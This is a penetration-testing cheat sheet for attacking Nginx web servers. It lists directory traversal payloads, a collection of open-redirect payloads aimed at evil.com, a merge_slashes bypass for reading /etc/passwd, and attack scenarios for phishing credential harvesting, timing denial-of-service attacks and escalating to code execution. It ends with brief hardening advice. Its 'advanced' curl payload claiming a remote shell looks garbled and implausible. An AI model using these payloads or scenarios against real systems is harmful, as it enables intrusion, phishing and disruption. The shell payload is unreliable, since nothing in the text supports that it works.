## 1. Overview

Nginx is a popular web server and reverse proxy that can contain security vulnerabilities through misconfigurations or outdated versions. When you encounter a website running Nginx, understanding common attack vectors and exploitation techniques is crucial for security assessment.

**Key Detection Method:**

- Check HTTP response headers for `Server: nginx`
- Examine 404 error pages (often display version information)

**Primary Vulnerability Categories:**

- CVE-based exploits (version-specific vulnerabilities)
- Directory traversal attacks
- Open redirect misconfigurations
- Information disclosure via status pages
- Path traversal with merge_slashes misconfiguration

---

## 2. Exploitation Methods

### 🎯 Step 1: Version Identification & CVE Discovery

**Action Steps:**

1. **Capture the Nginx version**
    
    - Inspect HTTP response headers
    - Trigger 404 errors to reveal version banners
    - Use automated scanners for version detection
2. **Cross-reference CVEs**
    
    - Visit [CVE Details - Nginx](https://www.cvedetails.com/vulnerability-list/vendor_id-315/product_id-101578/F5-Nginx.html)
    - Search for version-specific vulnerabilities
    - Prioritize high-severity exploits

---

### 🎯 Step 2: Directory Traversal Testing

**Testing Methodology:**

```text
# Pattern 1: Parent directory manipulation
https://example.com/folder1../folder1/folder2/static/main.css
https://example.com/folder1../%s/folder2/static/main.css

# Pattern 2: Mid-path traversal
https://example.com/folder1/folder2../folder2/static/main.css
https://example.com/folder1/folder2../%s/static/main.css

# Pattern 3: Static resource targeting
https://example.com/folder1/folder2/static../static/main.css
https://example.com/folder1/folder2/static../%s/main.css
```

**Pro Tip:** Test multiple directory levels and resource types for comprehensive coverage.

---

### 🎯 Step 3: Open Redirect Exploitation

**Top 10 Modern Payloads:**

```text
# Backslash-based bypasses
https://example.com/%5cevil.com
https://example.com//\evil.com
https://example.com/\/evil.com

# Protocol confusion
https://example.com/https:evil.com
https://example.com//https://evil.com@//

# Multiple slash techniques
https://example.com////evil.com
https://example.com///evil.com
https://example.com//evil.com//

# Encoded path traversal
https://example.com///evil.com/%2f%2e%2e
https://example.com//evil.com/%2F..
```

**Testing Checklist:**

- [ ] Test backslash variations (`\`, `\/`, `\\`)
- [ ] Try protocol-relative URLs
- [ ] Use encoded characters (`%5c`, `%2f`, `%2e`)
- [ ] Combine multiple slashes with domain injection
- [ ] Test @ symbol for credential-style redirects

---

### 🎯 Step 4: Nginx Status Page Discovery

**Quick Check:**

```text
https://example.com/nginx_status
```

**What You'll Find:**

- Active connections count
- Server performance metrics
- Worker process information
- Request statistics

**Impact:** Information disclosure that aids in further reconnaissance.

---

### 🎯 Step 5: merge_slashes Misconfiguration

**Exploitation Technique:**

When `merge_slashes` is set to OFF, path normalization fails, enabling traversal:

```bash
# Standard traversal (merge_slashes ON - blocked)
../../../etc/passwd

# Enhanced traversal (merge_slashes OFF - works)
///////../../../etc/passwd
```

**Action Steps:**

1. Test with standard path traversal first
2. Add extra leading slashes progressively
3. Monitor for different responses indicating bypass success

---

## 3. Bypasses

### Path Traversal Bypass Techniques

**Extra Slash Method:**

- Add additional forward slashes to bypass merge_slashes protection
- Pattern: `///////../../../[target_file]`

**Null Byte Injection:**

```text
curl -gsS https://example.com:443/../../../%00/nginx-handler?/usr/lib/nginx/modules/ngx_stream_module.so:127.0.0.1:80:/bin/sh%00example.com/../../../%00/n
```

**URL Encoding Variations:**

- Use `%2f` instead of `/`
- Mix encoded and non-encoded characters
- Double-encode special characters

---

## 4. Payloads Collection

### Directory Traversal Payloads (Top 6)

```text
1. https://example.com/folder1../folder1/folder2/static/main.css
2. https://example.com/folder1../%s/folder2/static/main.css
3. https://example.com/folder1/folder2../folder2/static/main.css
4. https://example.com/folder1/folder2../%s/static/main.css
5. https://example.com/folder1/folder2/static../static/main.css
6. https://example.com/folder1/folder2/static../%s/main.css
```

### Open Redirect Payloads (Top 10)

```text
1. https://example.com/%5cevil.com
2. https://example.com////\;@evil.com
3. https://example.com////evil.com
4. https://example.com///evil.com/%2f%2e%2e
5. https://example.com//\evil.com
6. https://example.com//evil.com//
7. https://example.com/\/evil.com
8. https://example.com/https:evil.com
9. https://example.com//https://evil.com@//
10. https://example.com/evil.com/..;/css
```

### Advanced Exploitation Payload

```bash
# Complex handler manipulation with remote shell
curl -gsS https://example.com:443/../../../%00/nginx-handler?/usr/lib/nginx/modules/ngx_stream_module.so:127.0.0.1:80:/bin/sh%00example.com/../../../%00/n
```

---

## 5. Higher Impact Scenarios

### 🚀 Scenario 1: Configuration File Access

**Exploit Chain:**

- Use directory traversal → Access `/etc/nginx/nginx.conf`
- Extract backend server IPs, authentication mechanisms
- Pivot to internal systems

### 🚀 Scenario 2: Open Redirect to Credential Harvesting

**Attack Flow:**

1. Identify open redirect vulnerability
2. Craft phishing campaign using trusted domain
3. Redirect victims to credential harvesting page
4. Bypass email filters using legitimate domain reputation

### 🚀 Scenario 3: Status Page + DoS Intelligence

**Reconnaissance Value:**

- Monitor nginx_status for traffic patterns
- Identify peak load times for DoS attacks
- Calculate worker capacity limits
- Time attacks for maximum impact

### 🚀 Scenario 4: Path Traversal to RCE

**Escalation Path:**

- Traverse to upload directories
- Access temporarily stored files
- Combine with file upload vulnerabilities
- Execute malicious code via path manipulation

---

## 6. Mitigations

### For Security Teams

**Configuration Hardening:**

```nginx
# Enable merge_slashes (default is ON)
merge_slashes on;

# Disable version disclosure
server_tokens off;

# Restrict status page access
location /nginx_status {
    stub_status on;
    allow 127.0.0.1;
    deny all;
}
```

**Key Defense Strategies:**

- [ ] Keep Nginx updated to latest stable version
- [ ] Review and audit all redirect configurations
- [ ] Implement strict input validation on all paths
- [ ] Use WAF rules to block traversal patterns
- [ ] Disable unnecessary modules and handlers
- [ ] Implement proper access controls on sensitive endpoints
- [ ] Monitor logs for suspicious traversal attempts
- [ ] Conduct regular security assessments

**Pro Tip:** Defense in depth—combine multiple mitigation layers for robust protection! 🛡️

---

## References

- [Detectify - Common Nginx Misconfigurations](https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/)
- [CVE Details - F5 Nginx Vulnerabilities](https://www.cvedetails.com/vulnerability-list/vendor_id-315/product_id-101578/F5-Nginx.html)

---

**Motivation Boost:** Master these techniques systematically, and you'll level up your web application security skills! Every test brings you closer to becoming an expert. Stay curious, stay methodical! 🎯🔒